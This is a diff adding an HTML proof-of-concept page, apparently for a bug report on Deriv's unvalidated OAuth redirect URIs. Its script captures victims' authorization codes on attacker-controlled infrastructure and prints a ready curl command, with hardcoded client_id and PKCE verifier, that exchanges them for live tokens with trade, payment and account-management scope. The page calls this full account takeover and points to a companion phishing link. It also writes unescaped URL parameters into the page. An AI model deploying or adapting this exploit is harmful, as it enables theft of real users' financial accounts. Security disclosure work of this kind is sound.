@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Deriv OAuth Callback — PoC Evidence</title>
+<style>
+body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 40px; max-width: 800px; margin: 0 auto; }
+h1 { color: #fff; }
+.section { background: #111; border: 1px solid #222; border-radius: 8px; padding: 20px; margin: 16px 0; }
+.label { color: #888; }
+.val { color: #ff0; word-break: break-all; }
+.success { color: #0f0; font-weight: bold; }
+.fail { color: #fe2c55; }
+.token-cmd { background: #000; border: 1px solid #333; border-radius: 4px; padding: 12px; overflow-x: auto; white-space: pre-wrap; color: #0ff; font-size: 13px; }
+</style>
+</head>
+<body>
+<h1>Deriv OAuth Callback — Evidence Capture</h1>
+<p style="color:#888">Redirect target for Deriv finding 03 (unvalidated OAuth app <code>redirect_uris</code>). See <code>deriv/findings/03-oauth-app-registration-no-validation.md</code>.</p>
+
+<div class="section" id="resultSection">
+<div id="loadingMsg">Processing OAuth callback parameters...</div>
+</div>
+
+<script>
+(function() {
+  const params = new URLSearchParams(window.location.search);
+  const code = params.get("code");
+  const state = params.get("state");
+  const error = params.get("error");
+  const errorDesc = params.get("error_description");
+  const EXPECTED_STATE = "IZsubfMsKpzKLuSJa0nCqJaRMShlzbrZ";
+  const CODE_VERIFIER = "zNJzRbJlRW7xTvFocIaCi8jGZyBpag3kpnMJD4HtMsbCp1BdC4OciqEo0LyysN9D3wvEtPc7JnsbDAr7t0Qo3g";
+  const CLIENT_ID = "01a06da7-5ee7-7784-ace8-1851107b7111";
+
+  const evidence = {
+    timestamp: new Date().toISOString(),
+    url: window.location.href,
+    code: code || null,
+    state: state || null,
+    stateMatchesExpected: state === EXPECTED_STATE,
+    error: error || null,
+    error_description: errorDesc || null,
+    userAgent: navigator.userAgent
+  };
+
+  const container = document.getElementById("resultSection");
+
+  if (code) {
+    container.innerHTML =
+      '<h2 class="success">&#10004; Authorization Code Captured</h2>' +
+      '<div class="section">' +
+      '<h2>Captured OAuth Parameters</h2>' +
+      '<div><span class="label">code:</span> <span class="val">' + code + '</span></div>' +
+      '<div><span class="label">state:</span> <span class="val">' + (state || "none") + '</span></div>' +
+      '<div><span class="label">state matches request:</span> <span class="val">' + evidence.stateMatchesExpected + '</span></div>' +
+      '</div>' +
+      '<div class="section">' +
+      '<h2>Token Exchange Command (PKCE — no client_secret needed)</h2>' +
+      '<div class="token-cmd">curl -X POST https://auth.deriv.com/oauth2/token \\\n' +
+      '  -H "Content-Type: application/x-www-form-urlencoded" \\\n' +
+      '  -d "grant_type=authorization_code" \\\n' +
+      '  -d "client_id=' + CLIENT_ID + '" \\\n' +
+      '  -d "code=' + code + '" \\\n' +
+      '  -d "code_verifier=' + CODE_VERIFIER + '" \\\n' +
+      '  -d "redirect_uri=' + window.location.origin + window.location.pathname + '"</div>' +
+      '</div>' +
+      '<div class="section">' +
+      '<h2>Full Evidence Object</h2>' +
+      '<pre style="color:#0f0;overflow-x:auto">' + JSON.stringify(evidence, null, 2) + '</pre>' +
+      '</div>' +
+      '<div class="section">' +
+      '<h2>What This Demonstrates</h2>' +
+      '<p class="success">A real Deriv OAuth2 authorization code, scoped to trade + payment + account_manage on whichever Deriv account just clicked "Allow", has landed on attacker-controlled infrastructure.</p>' +
+      '<p>Running the curl command above (server-side, using only the attacker\'s privately-held <code>code_verifier</code> — no password, no client_secret) exchanges this code for a live Bearer access token for that account. That token is then usable directly against <code>api.derivws.com</code> for trading, payments, and account management — full account takeover.</p>' +
+      '</div>';
+    console.log("%c[POC EVIDENCE] Deriv OAuth Code Captured", "color:lime;font-size:18px");
+    console.log(JSON.stringify(evidence, null, 2));
+  } else if (error) {
+    container.innerHTML =
+      '<h2 class="fail">&#10008; Authorization Failed</h2>' +
+      '<div class="section">' +
+      '<div><span class="label">error:</span> <span class="val">' + error + '</span></div>' +
+      '<div><span class="label">description:</span> <span class="val">' + (errorDesc || "none") + '</span></div>' +
+      '</div>' +
+      '<div class="section">' +
+      '<h2>Diagnostic</h2>' +
+      '<pre style="color:#0f0;overflow-x:auto">' + JSON.stringify(evidence, null, 2) + '</pre>' +
+      '</div>';
+  } else {
+    container.innerHTML =
+      '<h2>No OAuth Parameters Detected</h2>' +
+      '<p>This page is the redirect_uri registered for the PoC app <code>ATO_PoC_test_app</code> (client_id <span class="val">' + CLIENT_ID + '</span>). Visit it via the authorize link in <code>oauth-ato-phishing-link.html</code> to see a captured code here.</p>' +
+      '<div class="section">' +
+      '<pre style="color:#0f0;overflow-x:auto">' + JSON.stringify(evidence, null, 2) + '</pre>' +
+      '</div>';
+  }
+})();
+</script>
+</body>
+</html>
